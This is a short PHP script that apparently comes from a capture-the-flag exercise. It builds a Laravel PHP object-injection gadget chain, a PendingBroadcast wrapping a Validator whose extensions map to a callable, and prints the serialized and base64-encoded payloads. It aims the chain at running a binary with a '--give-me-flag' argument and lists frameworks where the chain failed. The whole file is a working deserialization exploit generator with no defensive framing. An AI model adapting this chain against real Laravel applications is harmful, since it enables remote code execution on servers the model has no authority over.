<?php
namespace Illuminate\Broadcasting {

    class PendingBroadcast
    {
        public $events;
        public $event;

        function __construct($events, $event)
        {
            $this->events = $events;
            $this->event = $event;
        }
    }
}

namespace Illuminate\Validation {

    class Validator
    {
        public $extensions;

        function __construct($extensions)
        {
            $this->extensions = $extensions;
        }
    }
}

namespace {
    $events = new Illuminate\Validation\Validator(['' => 'p0pp3r_win']);
    $event = "./@ --give-me-flag";
    $ori_name = new Illuminate\Broadcasting\PendingBroadcast($events, $event);

    $name = unserialize(serialize($ori_name));

    $name = serialize($name);
    echo $name;
    echo "\n";

    $new_name = substr(serialize($ori_name), 0, -1);

    $name = base64_encode($new_name);
    echo $name;
    echo "\n";

    echo "laravel/framework\n";

    die();

    /* fail list */
    // encore/laravel-admin
    // laravel/laravel
    // laravel/lumen-framework

    // new king
    // O:40:"Illuminate\Broadcasting\PendingBroadcast":2:{s:6:"events";O:31:"Illuminate\Validation\Validator":1:{s:10:"extensions";a:1:{s:0:"";s:10:"p0pp3r_win";}}s:5:"event";s:18:"./@ --give-me-flag";}
}

?>